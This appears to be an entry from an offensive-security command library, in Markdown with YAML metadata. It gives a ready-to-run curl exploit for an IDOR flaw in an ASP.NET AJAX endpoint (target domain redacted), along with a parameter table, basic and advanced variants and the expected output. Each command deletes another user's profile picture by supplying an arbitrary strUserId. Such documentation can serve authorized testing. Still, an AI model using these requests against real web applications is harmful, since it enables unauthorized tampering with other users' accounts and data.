---
id: cmd-uuid-123
data: >-
  curl -X POST https://████/AJAXUtilities.aspx -H "Content-Type:
  application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With:
  XMLHttpRequest" -H "Origin: https://████" -H "Referer:
  https://████/userprofile.aspx" -b "your-session-cookies-here" -d
  "strCall=DeleteProfilePicture&strUserId=72827C83FCED4483B2B1077EA5B0C041"
tags:
  - idor
  - http
  - post-request
type: command
output: 'text/plain response indicating success (e.g., empty or ''OK'')'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.095Z'
verified: false
validated: true
submitted: true
---
# curl-delete-profile-picture-idor

## Command

```bash
curl -X POST https://████/AJAXUtilities.aspx \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Origin: https://████" \
  -H "Referer: https://████/userprofile.aspx" \
  -b "your-session-cookies-here" \
  -d "strCall=DeleteProfilePicture&strUserId=72827C83FCED4483B2B1077EA5B0C041"
```

## Description

This curl command sends a POST request to exploit an IDOR vulnerability in an ASP.NET web application's AJAX endpoint, deleting a target user's profile picture by specifying an arbitrary strUserId. Use it in authenticated sessions to demonstrate unauthorized deletions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Content-Type: ..."` | Sets the form-encoded content type for the request body | Yes |
| `-H "X-Requested-With: ..."` | Mimics an AJAX request from the web app | Yes |
| `-H "Origin: ..."` | Sets the origin header to match the domain | Yes |
| `-H "Referer: ..."` | Refers to the profile page to simulate legitimate navigation | Yes |
| `-b "cookies"` | Includes session cookies for authentication | Yes |
| `-d "strCall=...&strUserId=..."` | Request body with action and target UserId | Yes |
| `strUserId` | Arbitrary hex UserId of the target (e.g., 72827C83FCED4483B2B1077EA5B0C041) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://████/AJAXUtilities.aspx -H "Content-Type: application/x-www-form-urlencoded" -d "strCall=DeleteProfilePicture&strUserId=TARGET_USER_ID"
```

### Advanced Usage

```bash
curl -X POST https://████/AJAXUtilities.aspx \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Cookie: ASP.NET_SessionId=abc123; AuthToken=xyz" \
  -d "strCall=DeleteProfilePicture&strUserId=72827C83FCED4483B2B1077EA5B0C041"
```

## Expected Output

A successful response is typically a plain text body with no errors (e.g., empty response or simple acknowledgment like "1" indicating deletion). Failure would return an error message if authorization were enforced.

## Related

- [[procedures/Exploit-IDOR-to-Delete-User-Profile-Pictures]]
